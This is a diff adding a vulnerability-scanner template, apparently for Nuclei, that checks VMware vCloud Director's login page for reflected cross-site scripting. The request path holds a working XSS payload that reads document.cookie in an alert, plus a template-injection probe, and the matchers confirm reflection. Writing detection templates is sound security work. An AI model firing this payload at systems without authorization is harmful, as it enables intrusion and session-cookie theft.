@@ -1,0 +1,35 @@
+id: kaue-xss-vmware-vcloud-director
+
+info:
+  name: kaue-xss-vmware-vcloud-director
+  author: kauenavarro
+  severity: medium
+  description: Injection in parameter.
+  tags: xss
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/login/?service=tenant:;;9503%22();}]</script><img%20src=x%20onerror=alert(document.cookie)>{{7*7}}9310&redirectTo=%2Ftenant%2F%3B%253B9503%2522%2528%2529%253B%257D%255D9310'
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<img src=x onerror=alert(document.cookie)>'
+
+        part: body
+
+        condition: and
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+        condition: and
+
+      - type: status
+        status:
+          - 200
